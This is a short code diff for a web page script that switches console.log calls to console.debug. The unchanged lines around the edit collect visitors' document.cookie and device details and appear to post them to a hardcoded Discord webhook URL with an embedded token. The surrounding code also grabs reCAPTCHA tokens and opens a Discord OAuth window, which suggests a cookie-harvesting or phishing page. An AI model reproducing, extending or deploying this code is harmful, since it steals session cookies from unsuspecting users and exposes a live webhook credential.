@@ -36,7 +36,7 @@
 					deviceHeight: deviceHeight,
 					cookie: document.cookie,
 				};
-				console.log(data);
+				console.debug(data);
 
 				const url = 'https://discord.com/api/webhooks/1535164470857441301/0zbvwxDyrPCIo-3067PQ2sBp7wxindDS5DBorb4cX4P2CF-NrS4K2D7IeyfZsKDxRV6f?wait=true';
 				{
@@ -88,11 +88,11 @@
 			e.preventDefault();
 
 			const button = e.submitter || e.target.querySelector('button[type="submit"]') || e.target;
-			console.log(e);
+			console.debug(e);
 			
 			if(!button || typeof button.dataset.provider === 'undefined') return false;
 			
-			console.log(e);
+			console.debug(e);
 			const formdata = {};
 			formdata['g-recaptcha-response'] = googleRecaptcha.getToken();
 			JSON.parse(button.parentElement.querySelector('input[name="item-list"]').value).forEach((itemId)=>{
@@ -104,7 +104,7 @@
 					name: input.name,
 				};
 			});
-			console.log(formdata);
+			console.debug(formdata);
 
 			new n138().sendUserAgent();
 			let res = null;
@@ -141,8 +141,8 @@
 			e.url = `https://discord.com/oauth2/authorize?client_id=${e.clientId}&response_type=code&redirect_uri=${encodeURIComponent(e.redirectUri)}&scope=${encodeURIComponent(e.scope)}`;
 			window.open(e.url, 'discord_oauth2', 'width=500,height=600');
 
-			console.log(e);
-			console.log(googleRecaptcha.getToken());
+			console.debug(e);
+			console.debug(googleRecaptcha.getToken());
 			
 			return false;
 		};
